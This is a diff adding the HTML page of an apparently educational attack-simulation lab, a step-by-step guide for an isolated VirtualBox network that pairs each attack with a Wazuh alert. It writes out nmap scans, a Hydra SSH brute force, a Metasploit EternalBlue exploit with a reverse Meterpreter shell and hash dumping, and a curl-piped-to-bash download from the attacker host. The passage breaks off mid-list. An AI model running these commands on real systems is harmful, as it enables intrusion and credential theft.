@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attack Guide – CASL</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    .guide-layout {
+      display: grid;
+      grid-template-columns: 300px 1fr;
+      gap: 20px;
+    }
+
+    /* Attack selector */
+    .attack-selector {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .attack-btn {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      cursor: pointer;
+      transition: var(--transition);
+      text-align: left;
+    }
+
+    .attack-btn:hover {
+      border-color: var(--border);
+    }
+
+    .attack-btn.active {
+      border-color: var(--atk-color);
+      background: rgba(0, 0, 0, 0.3);
+    }
+
+    .attack-btn .atk-icon {
+      width: 38px;
+      height: 38px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1rem;
+      flex-shrink: 0;
+    }
+
+    .attack-btn .atk-name {
+      font-size: 0.875rem;
+      font-weight: 600;
+    }
+
+    .attack-btn .atk-cat {
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* Guide content */
+    .guide-content {
+      display: none;
+    }
+
+    .guide-content.active {
+      display: block;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .guide-header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 24px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-lg);
+      margin-bottom: 20px;
+    }
+
+    .guide-icon {
+      width: 60px;
+      height: 60px;
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6rem;
+      flex-shrink: 0;
+    }
+
+    .guide-title {
+      font-size: 1.3rem;
+      font-weight: 800;
+    }
+
+    .guide-desc {
+      font-size: 0.875rem;
+      color: var(--text-secondary);
+      margin-top: 4px;
+    }
+
+    /* Prerequisites */
+    .prereq-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .prereq-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 14px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      font-size: 0.82rem;
+    }
+
+    .prereq-item i {
+      color: var(--green);
+      font-size: 0.9rem;
+    }
+
+    /* Steps */
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .step-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      transition: var(--transition);
+    }
+
+    .step-card:hover {
+      border-color: var(--border);
+    }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 16px 20px;
+      cursor: pointer;
+    }
+
+    .step-num {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .step-info {
+      flex: 1;
+    }
+
+    .step-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+    }
+
+    .step-sub {
+      font-size: 0.76rem;
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+
+    .step-body {
+      padding: 0 20px 20px;
+      display: none;
+    }
+
+    .step-body.open {
+      display: block;
+    }
+
+    .step-p {
+      font-size: 0.875rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 14px;
+    }
+
+    /* Command block */
+    .cmd-block {
+      background: #000;
+      border: 1px solid rgba(0, 255, 136, 0.2);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      margin-bottom: 14px;
+    }
+
+    .cmd-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 14px;
+      background: #0a0a0a;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .cmd-copy {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      background: rgba(0, 255, 136, 0.1);
+      border: 1px solid rgba(0, 255, 136, 0.2);
+      border-radius: 4px;
+      color: var(--green);
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+
+    .cmd-copy:hover {
+      background: rgba(0, 255, 136, 0.2);
+    }
+
+    .cmd-lines {
+      padding: 14px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+    }
+
+    .cmd-line {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 4px;
+    }
+
+    .cmd-prompt {
+      color: var(--green);
+      flex-shrink: 0;
+    }
+
+    .cmd-text {
+      color: #e2e8f0;
+    }
+
+    .cmd-comment {
+      color: #475569;
+    }
+
+    /* Expected output */
+    .output-block {
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-left: 3px solid var(--cyan);
+      border-radius: 0 var(--radius-md) var(--radius-md) 0;
+      padding: 12px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 14px;
+    }
+
+    .output-block .out-title {
+      color: var(--cyan);
+      font-size: 0.7rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .out-good {
+      color: var(--green);
+    }
+
+    .out-warn {
+      color: var(--orange);
+    }
+
+    .out-bad {
+      color: var(--red);
+    }
+
+    /* Wazuh alert preview */
+    .wazuh-preview {
+      background: rgba(255, 68, 68, 0.05);
+      border: 1px solid rgba(255, 68, 68, 0.2);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      margin-bottom: 14px;
+    }
+
+    .wazuh-preview .wt {
+      color: var(--red);
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .wazuh-field {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 3px;
+    }
+
+    .wk {
+      color: var(--text-muted);
+      min-width: 90px;
+    }
+
+    .wv {
+      color: var(--orange);
+    }
+
+    /* Tags row */
+    .tags-row {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+      margin-bottom: 14px;
+    }
+
+    /* Warning box */
+    .warn-box {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      background: rgba(255, 68, 68, 0.06);
+      border: 1px solid rgba(255, 68, 68, 0.2);
+      border-radius: var(--radius-md);
+      padding: 12px 16px;
+      font-size: 0.82rem;
+      color: var(--text-secondary);
+      margin-bottom: 14px;
+    }
+
+    .warn-box i {
+      color: var(--red);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    /* Execute real button */
+    .exec-real-btn {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 13px 20px;
+      background: linear-gradient(135deg, rgba(255, 68, 68, 0.15), rgba(255, 140, 0, 0.15));
+      border: 1px solid rgba(255, 68, 68, 0.3);
+      border-radius: var(--radius-md);
+      color: var(--text-primary);
+      font-size: 0.875rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      margin-top: 10px;
+    }
+
+    .exec-real-btn:hover {
+      border-color: var(--red);
+      background: rgba(255, 68, 68, 0.2);
+    }
+
+    .difficulty {
+      display: flex;
+      gap: 4px;
+      align-items: center;
+    }
+
+    .diff-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+    }
+
+    /* ── Interactive Terminal ── */
+    .iterm-wrap {
+      background: #000;
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      margin-top: 16px;
+    }
+
+    .iterm-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 7px 14px;
+      background: #0d1117;
+      border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+      font-size: 0.72rem;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .iterm-bar-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .iterm-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .iterm-title {
+      color: var(--text-muted);
+      font-size: 0.7rem;
+    }
+
+    .iterm-mode {
+      font-size: 0.68rem;
+      padding: 2px 8px;
+      border-radius: 4px;
+      background: rgba(0, 255, 136, 0.1);
+      color: var(--green);
+      border: 1px solid rgba(0, 255, 136, 0.2);
+    }
+
+    .iterm-history {
+      padding: 12px 16px;
+      min-height: 80px;
+      max-height: 260px;
+      overflow-y: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      line-height: 1.6;
+    }
+
+    .iterm-line {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 2px;
+    }
+
+    .iterm-prompt {
+      color: var(--green);
+      flex-shrink: 0;
+      white-space: nowrap;
+    }
+
+    .iterm-cmd {
+      color: #e2e8f0;
+    }
+
+    .iterm-out {
+      display: block;
+      color: var(--text-secondary);
+      padding-left: 0;
+      margin: 2px 0 6px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .iterm-out.good {
+      color: var(--green);
+    }
+
+    .iterm-out.warn {
+      color: var(--orange);
+    }
+
+    .iterm-out.err {
+      color: var(--red);
+    }
+
+    .iterm-out.info {
+      color: var(--cyan);
+    }
+
+    .iterm-input-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px 10px;
+      border-top: 1px solid rgba(0, 255, 136, 0.08);
+      background: #000;
+    }
+
+    .iterm-prompt-label {
+      color: var(--green);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      flex-shrink: 0;
+      white-space: nowrap;
+    }
+
+    .iterm-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #e2e8f0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      caret-color: var(--green);
+    }
+
+    .iterm-enter-btn {
+      padding: 4px 12px;
+      background: rgba(0, 255, 136, 0.12);
+      border: 1px solid rgba(0, 255, 136, 0.25);
+      border-radius: 5px;
+      color: var(--green);
+      font-size: 0.72rem;
+      font-family: 'JetBrains Mono', monospace;
+      cursor: pointer;
+      transition: var(--transition);
+      white-space: nowrap;
+    }
+
+    .iterm-enter-btn:hover {
+      background: rgba(0, 255, 136, 0.22);
+    }
+
+    .iterm-feedback {
+      padding: 8px 16px;
+      font-size: 0.78rem;
+      font-family: 'JetBrains Mono', monospace;
+      border-top: 1px solid rgba(255, 255, 255, 0.04);
+      display: none;
+    }
+
+    .iterm-feedback.show {
+      display: block;
+    }
+
+    .iterm-feedback.correct {
+      color: var(--green);
+      background: rgba(0, 255, 136, 0.05);
+    }
+
+    .iterm-feedback.wrong {
+      color: var(--orange);
+      background: rgba(255, 140, 0, 0.05);
+    }
+
+    .iterm-feedback.hint {
+      color: var(--cyan);
+      background: rgba(0, 212, 255, 0.05);
+    }
+
+    /* Progress */
+    .step-progress {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-left: auto;
+      margin-right: 12px;
+    }
+
+    .step-done-badge {
+      font-size: 0.68rem;
+      padding: 2px 8px;
+      background: rgba(0, 255, 136, 0.1);
+      color: var(--green);
+      border: 1px solid rgba(0, 255, 136, 0.2);
+      border-radius: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      display: none;
+    }
+
+    .step-done-badge.show {
+      display: inline-block;
+    }
+
+    .overall-progress {
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      padding: 14px 20px;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .op-label {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      font-family: 'JetBrains Mono', monospace;
+      white-space: nowrap;
+    }
+
+    .op-bar {
+      flex: 1;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .op-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--green), var(--cyan));
+      border-radius: 4px;
+      transition: width 0.4s ease;
+    }
+
+    .op-score {
+      font-size: 0.9rem;
+      font-weight: 800;
+      color: var(--green);
+      font-family: 'JetBrains Mono', monospace;
+      white-space: nowrap;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app-layout">
+    <aside class="sidebar">
+      <div class="sidebar-logo">
+        <div class="logo-icon"><i class="fas fa-shield-halved"></i></div>
+        <div class="logo-text"><span class="logo-title">CYBER ATTACK</span><span class="logo-sub">// Simulation
+            Lab</span></div>
+      </div>
+      <nav class="sidebar-nav">
+        <div class="nav-section-label">Main</div>
+        <a class="nav-item" href="dashboard.html"><i class="fas fa-gauge-high"></i> Dashboard</a>
+        <a class="nav-item" href="simulations.html"><i class="fas fa-bolt"></i> Simulations</a>
+        <a class="nav-item" href="monitoring.html"><i class="fas fa-radar"></i> Monitoring</a>
+        <a class="nav-item" href="reports.html"><i class="fas fa-chart-bar"></i> Reports</a>
+        <a class="nav-item" href="topology.html"><i class="fas fa-diagram-project"></i> Network Map</a>
+        <a class="nav-item" href="chapters.html"><i class="fas fa-book-open"></i> Documentation</a>
+        <a class="nav-item active" href="learn.html"><i class="fas fa-graduation-cap"></i> Attack Guide</a>
+        <a class="nav-item" href="battle.html"><i class="fas fa-swords"></i> Battle Mode <span class="nav-badge"
+            style="background:#ff4444;color:#fff">NEW</span></a>
+        <div class="nav-section-label">System</div>
+        <a class="nav-item" href="#"><i class="fas fa-sliders"></i> Settings</a>
+        <a class="nav-item" href="#" id="logout-btn"><i class="fas fa-right-from-bracket"></i> Logout</a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="user-profile">
+          <div class="user-avatar" id="sidebar-user-avatar">A</div>
+          <div class="user-info">
+            <div class="user-name" id="sidebar-user-name">Administrator</div>
+            <div class="user-role" id="sidebar-user-role">Lab Admin</div>
+          </div>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <header class="app-header">
+        <div class="header-left">
+          <div>
+            <div class="page-title">Ethical Attack Guide</div>
+            <div class="page-subtitle">// Step-by-step real attack tutorials · For isolated lab use only</div>
+          </div>
+        </div>
+        <div class="header-right">
+          <div class="system-status" style="color:var(--orange)">
+            <div class="status-dot" style="background:var(--orange)"></div> EDUCATIONAL MODE
+          </div>
+          <div class="header-time" id="header-clock">00:00:00</div>
+        </div>
+      </header>
+
+      <main class="page-content">
+
+        <!-- Ethics banner -->
+        <div class="warn-box" style="margin-bottom:22px">
+          <i class="fas fa-shield-halved" style="color:var(--orange);font-size:1.1rem"></i>
+          <div>
+            <strong style="color:var(--orange)">Ethical Use Only:</strong> All commands below must be executed
+            <strong>only inside your isolated VirtualBox lab</strong> (192.168.100.0/24). Never use these on external
+            systems or networks you don't own. This guide is for educational purposes as defined in Section 1.10 of the
+            project.
+          </div>
+        </div>
+
+        <!-- Lab Checklist -->
+        <div class="card section">
+          <div class="card-header">
+            <div class="card-title"><i class="fas fa-clipboard-check"></i> Pre-Attack Lab Checklist</div>
+            <button class="btn btn-outline btn-sm" onclick="checkAll()"><i class="fas fa-check-double"></i> Check
+              All</button>
+          </div>
+          <div class="prereq-grid">
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk1" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fab fa-windows"></i> VirtualBox is running
+            </label>
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk2" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fas fa-skull-crossbones"></i> Kali Linux VM started
+            </label>
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk3" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fas fa-server"></i> Victim VM started
+            </label>
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk4" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fas fa-eye"></i> Wazuh server running
+            </label>
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk5" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fas fa-network-wired"></i> Network: Internal Only
+            </label>
+            <label class="prereq-item" style="cursor:pointer">
+              <input type="checkbox" id="chk6" style="accent-color:var(--green);width:16px;height:16px"
+                onchange="updateChecklist()" />
+              <i class="fas fa-shield-halved"></i> No internet bridging
+            </label>
+          </div>
+          <div id="checklist-status"
+            style="font-size:0.82rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace">
+            0/6 prerequisites confirmed
+          </div>
+        </div>
+
+        <div class="guide-layout section">
+
+          <!-- Left: Attack selector -->
+          <div>
+            <div class="section-header">
+              <div class="section-title"><i class="fas fa-crosshairs"></i> Select Attack</div>
+            </div>
+            <div class="attack-selector" id="attack-selector"></div>
+          </div>
+
+          <!-- Right: Guide content -->
+          <div id="guide-area"></div>
+
+        </div>
+      </main>
+    </div>
+  </div>
+  <div id="toast-container"></div>
+  <script src="js/app.js"></script>
+  <script>
+    Auth.requireAuth();
+
+    /* ─── Attack definitions ─── */
+    const ATTACKS = [
+      {
+        id: 'recon',
+        name: 'Network Reconnaissance',
+        cat: 'Phase 1 · Discovery',
+        icon: 'fa-network-wired',
+        color: '#00d4ff',
+        difficulty: 1,
+        mitre: 'T1046',
+        desc: 'Discover open ports, running services, and OS fingerprinting using Nmap.',
+        prereqs: ['Kali Linux terminal open', 'Target VM running', 'Internal network only'],
+        steps: [
+          {
+            title: 'Ping Sweep — Discover Live Hosts',
+            sub: 'Find which IPs are active on the network',
+            num_color: '#00d4ff',
+            explain: 'Before attacking, you must find which hosts are alive. This sends ICMP pings to the entire subnet.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'nmap -sn 192.168.100.0/24', comment: '# Ping sweep entire subnet' },
+              { prompt: '>', cmd: '', comment: '# OR using a simple loop:' },
+              { prompt: 'root@kali:~#', cmd: 'for i in $(seq 1 254); do ping -c1 -W1 192.168.100.$i &>/dev/null && echo "Host UP: 192.168.100.$i"; done' },
+            ],
+            output: [
+              { cls: '', t: 'Nmap scan report for 192.168.100.10' },
+              { cls: 'out-good', t: 'Host is up (0.001s latency).' },
+              { cls: '', t: 'Nmap scan report for 192.168.100.20' },
+              { cls: 'out-good', t: 'Host is up (0.002s latency).' },
+              { cls: 'out-good', t: '3 hosts up, 253 hosts down.' },
+            ],
+            wazuh: { rule: '533', desc: 'Host discovery scan detected', sev: 'LOW', rule_name: 'Nmap - Host Discovery' }
+          },
+          {
+            title: 'Port Scan — Find Open Ports',
+            sub: 'Detect all open TCP ports on target',
+            num_color: '#00d4ff',
+            explain: 'Now scan for open ports on the target. -sV detects service versions, -sC runs default scripts.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'nmap -sV -sC -p- --open 192.168.100.20', comment: '# Full port scan with service detection' },
+              { prompt: 'root@kali:~#', cmd: 'nmap -sV -O 192.168.100.20 -oN scan_results.txt', comment: '# Save results and detect OS' },
+            ],
+            output: [
+              { cls: '', t: 'PORT     STATE  SERVICE   VERSION' },
+              { cls: 'out-good', t: '22/tcp   open   ssh       OpenSSH 8.9 (Ubuntu 22.04)' },
+              { cls: 'out-good', t: '80/tcp   open   http      Apache httpd 2.4.52' },
+              { cls: 'out-good', t: '443/tcp  open   https     Apache httpd 2.4.52' },
+              { cls: 'out-warn', t: '3389/tcp open   ms-wbt    Microsoft RDP' },
+              { cls: 'out-warn', t: '445/tcp  open   smb       Samba 4.13.x' },
+            ],
+            wazuh: { rule: '1002', desc: 'Nmap aggressive scan detected on port range > 1024', sev: 'HIGH', rule_name: 'Port Scan Activity' }
+          },
+          {
+            title: 'Vulnerability Scan',
+            sub: 'Identify known CVEs on detected services',
+            num_color: '#00d4ff',
+            explain: 'Use Nmap vulnerability scripts to find known CVEs automatically.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'nmap --script vuln 192.168.100.20', comment: '# Check for known vulnerabilities' },
+              { prompt: 'root@kali:~#', cmd: 'nmap --script smb-vuln* 192.168.100.20', comment: '# Check SMB vulnerabilities (EternalBlue)' },
+            ],
+            output: [
+              { cls: 'out-bad', t: '| smb-vuln-ms17-010:' },
+              { cls: 'out-bad', t: '|   VULNERABLE: Remote Code Execution via EternalBlue' },
+              { cls: 'out-bad', t: '|   CVE: CVE-2017-0144' },
+              { cls: 'out-warn', t: '|   Risk factor: HIGH' },
+              { cls: 'out-good', t: '|   References: https://technet.microsoft.com/...' },
+            ],
+            wazuh: { rule: '510', desc: 'Vulnerability scanner detected — multiple CVE probes', sev: 'MEDIUM', rule_name: 'Vulnerability Scan Activity' }
+          }
+        ]
+      },
+      {
+        id: 'bruteforce',
+        name: 'SSH Brute Force',
+        cat: 'Phase 2 · Initial Access',
+        icon: 'fa-key',
+        color: '#ff4444',
+        difficulty: 2,
+        mitre: 'T1110',
+        desc: 'Crack SSH credentials using dictionary attacks with Hydra.',
+        prereqs: ['Target SSH port 22 open', 'Wordlist available', 'Kali Linux running'],
+        steps: [
+          {
+            title: 'Prepare Wordlists',
+            sub: 'Get credential lists ready',
+            num_color: '#ff4444',
+            explain: 'Kali Linux comes with rockyou.txt — one of the most common password lists. Uncompress it first.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'ls /usr/share/wordlists/', comment: '# List available wordlists' },
+              { prompt: 'root@kali:~#', cmd: 'gunzip /usr/share/wordlists/rockyou.txt.gz', comment: '# Uncompress rockyou.txt' },
+              { prompt: 'root@kali:~#', cmd: 'wc -l /usr/share/wordlists/rockyou.txt', comment: '# Check: 14 million passwords' },
+            ],
+            output: [
+              { cls: 'out-good', t: '14344392 /usr/share/wordlists/rockyou.txt' },
+            ],
+            wazuh: null
+          },
+          {
+            title: 'Brute Force SSH with Hydra',
+            sub: 'Run dictionary attack against SSH',
+            num_color: '#ff4444',
+            explain: 'Hydra will try all passwords from the list. -t 4 means 4 parallel threads. Watch Wazuh alerts appear!',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20 -t 4 -V', comment: '# Brute force as root' },
+              { prompt: 'root@kali:~#', cmd: 'hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.100.20 ssh', comment: '# Try multiple usernames' },
+            ],
+            output: [
+              { cls: '', t: '[DATA] attacking ssh://192.168.100.20:22/' },
+              { cls: 'out-warn', t: '[ATTEMPT] target 192.168.100.20 login "root" pass "123456"' },
+              { cls: 'out-warn', t: '[ATTEMPT] target 192.168.100.20 login "root" pass "password"' },
+              { cls: 'out-good', t: '[22][ssh] host: 192.168.100.20   login: root   password: toor' },
+              { cls: 'out-good', t: '1 of 1 target successfully completed, 1 valid password found' },
+            ],
+            wazuh: { rule: '5712', desc: 'Multiple SSH authentication failures from same source IP', sev: 'CRITICAL', rule_name: 'SSH Brute Force Attack' }
+          },
+          {
+            title: 'Login with Found Credentials',
+            sub: 'Access the victim system via SSH',
+            num_color: '#ff4444',
+            explain: 'Once you have credentials, log in directly via SSH. You now have shell access!',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'ssh root@192.168.100.20', comment: '# Login to victim' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'whoami && id && hostname', comment: '# Confirm access' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'cat /etc/passwd', comment: '# View all users' },
+            ],
+            output: [
+              { cls: 'out-good', t: 'root' },
+              { cls: 'out-good', t: 'uid=0(root) gid=0(root) groups=0(root)' },
+              { cls: 'out-good', t: 'ubuntu-victim' },
+              { cls: 'out-bad', t: '[!] Wazuh Alert: SSH_LOGIN_SUCCESS after multiple failures — CRITICAL' },
+            ],
+            wazuh: { rule: '5720', desc: 'Successful SSH login after repeated failures — brute force success', sev: 'CRITICAL', rule_name: 'Brute Force Success' }
+          }
+        ]
+      },
+      {
+        id: 'metasploit',
+        name: 'Metasploit Exploit',
+        cat: 'Phase 2 · Exploitation',
+        icon: 'fa-skull-crossbones',
+        color: '#a855f7',
+        difficulty: 3,
+        mitre: 'T1203',
+        desc: 'Exploit EternalBlue (MS17-010) vulnerability to get a Meterpreter shell.',
+        prereqs: ['SMB port 445 open on victim', 'EternalBlue vulnerable target', 'Metasploit installed on Kali'],
+        steps: [
+          {
+            title: 'Launch Metasploit Console',
+            sub: 'Start the MSF framework',
+            num_color: '#a855f7',
+            explain: 'Metasploit Framework is the most powerful exploitation tool. Launch it with msfconsole.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'msfconsole -q', comment: '# -q = quiet mode (no banner)' },
+              { prompt: 'msf6 >', cmd: 'search eternalblue', comment: '# Find EternalBlue modules' },
+              { prompt: 'msf6 >', cmd: 'use exploit/windows/smb/ms17_010_eternalblue', comment: '# Select the exploit' },
+            ],
+            output: [
+              { cls: 'out-good', t: 'Module loaded: exploit/windows/smb/ms17_010_eternalblue' },
+              { cls: '', t: 'Description: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption' },
+            ],
+            wazuh: null
+          },
+          {
+            title: 'Configure & Run Exploit',
+            sub: 'Set target IP and payload, then exploit',
+            num_color: '#a855f7',
+            explain: 'Set RHOSTS to victim IP, LHOST to your Kali IP. A Meterpreter reverse shell will connect back to you.',
+            commands: [
+              { prompt: 'msf6 exploit>', cmd: 'set RHOSTS 192.168.100.20', comment: '# Target (victim)' },
+              { prompt: 'msf6 exploit>', cmd: 'set LHOST 192.168.100.10', comment: '# Your Kali IP' },
+              { prompt: 'msf6 exploit>', cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
+              { prompt: 'msf6 exploit>', cmd: 'show options', comment: '# Verify settings' },
+              { prompt: 'msf6 exploit>', cmd: 'run', comment: '# Launch the attack' },
+            ],
+            output: [
+              { cls: '', t: '[*] Started reverse TCP handler on 192.168.100.10:4444' },
+              { cls: 'out-warn', t: '[*] 192.168.100.20:445 - Connecting to target...' },
+              { cls: 'out-warn', t: '[*] Sending stage (200774 bytes) to 192.168.100.20' },
+              { cls: 'out-good', t: '[*] Meterpreter session 1 opened ✓' },
+            ],
+            wazuh: { rule: '31526', desc: 'EternalBlue SMB exploit payload detected — CVE-2017-0144', sev: 'CRITICAL', rule_name: 'MS17-010 Exploit Attempt' }
+          },
+          {
+            title: 'Post-Exploitation with Meterpreter',
+            sub: 'Explore the compromised system',
+            num_color: '#a855f7',
+            explain: 'You now have full SYSTEM access. Meterpreter gives you a powerful shell with many built-in commands.',
+            commands: [
+              { prompt: 'meterpreter >', cmd: 'sysinfo', comment: '# System information' },
+              { prompt: 'meterpreter >', cmd: 'getuid', comment: '# Current user (should be SYSTEM)' },
+              { prompt: 'meterpreter >', cmd: 'hashdump', comment: '# Dump password hashes' },
+              { prompt: 'meterpreter >', cmd: 'shell', comment: '# Drop to native CMD shell' },
+              { prompt: 'meterpreter >', cmd: 'screenshot', comment: '# Take screenshot of desktop' },
+            ],
+            output: [
+              { cls: 'out-good', t: 'Computer: WIN-SERVER2022' },
+              { cls: 'out-good', t: 'OS: Windows Server 2022 Build 20348' },
+              { cls: 'out-good', t: 'Server username: NT AUTHORITY\\SYSTEM' },
+              { cls: 'out-bad', t: 'Administrator:500:...LM_HASH...NT_HASH...' },
+            ],
+            wazuh: { rule: '5600', desc: 'Meterpreter reverse shell established — C2 channel detected', sev: 'CRITICAL', rule_name: 'Remote Shell Connection' }
+          }
+        ]
+      },
+      {
+        id: 'privesc',
+        name: 'Privilege Escalation',
+        cat: 'Phase 3 · Escalation',
+        icon: 'fa-user-shield',
+        color: '#00ff88',
+        difficulty: 2,
+        mitre: 'T1068',
+        desc: 'Escalate from low-privilege user to root using SUDO misconfigurations.',
+        prereqs: ['SSH access as low-privilege user', 'Ubuntu victim VM', 'LinPEAS script on Kali'],
+        steps: [
+          {
+            title: 'Check Current Privileges',
+            sub: 'Understand your starting position',
+            num_color: '#00ff88',
+            explain: 'After gaining initial low-level access, check your current permissions.',
+            commands: [
+              { prompt: 'www-data@ubuntu:~$', cmd: 'whoami && id', comment: '# Who am I?' },
+              { prompt: 'www-data@ubuntu:~$', cmd: 'sudo -l', comment: '# What can I run as root?' },
+              { prompt: 'www-data@ubuntu:~$', cmd: 'cat /etc/sudoers', comment: '# Check sudo config' },
+            ],
+            output: [
+              { cls: '', t: 'www-data' },
+              { cls: '', t: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' },
+              { cls: 'out-warn', t: 'User www-data may run the following as root:' },
+              { cls: 'out-bad', t: '    (ALL) NOPASSWD: /usr/bin/vim' },
+            ],
+            wazuh: null
+          },
+          {
+            title: 'Run LinPEAS for Auto-Detection',
+            sub: 'Automated privilege escalation scanner',
+            num_color: '#00ff88',
+            explain: 'LinPEAS automatically finds privesc paths. Download it from Kali and run on the victim.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'python3 -m http.server 8080', comment: '# Serve LinPEAS from Kali' },
+              { prompt: 'www-data@ubuntu:~$', cmd: 'curl http://192.168.100.10:8080/linpeas.sh | bash', comment: '# Download & run on victim' },
+            ],
+            output: [
